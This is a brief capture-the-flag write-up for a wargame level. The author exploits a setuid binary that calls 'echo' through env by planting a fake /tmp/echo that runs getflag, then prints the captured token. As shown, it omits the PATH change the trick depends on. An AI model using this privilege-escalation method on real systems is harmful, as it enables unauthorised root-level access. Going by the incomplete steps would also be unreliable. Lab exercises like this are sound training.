## Level 03

we have a level03 file, it have some specific rights access
```-rwsr-sr-x```
when we execute it, we have this message
./level03
```Exploit me```
first, i've tried to exploit it with nm ./level03 to see what functions are used, but i've don't get a lot of things interessting. So i've made it with strings ./level03 and i've seen more interesting stuff
```/usr/bin/env echo Exploit me```
So you have to replace the echo function with your own (a getflag to)
```echo getflag > /tmp/echo```
```chmod 777 /tmp/echo```
```./level03```
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus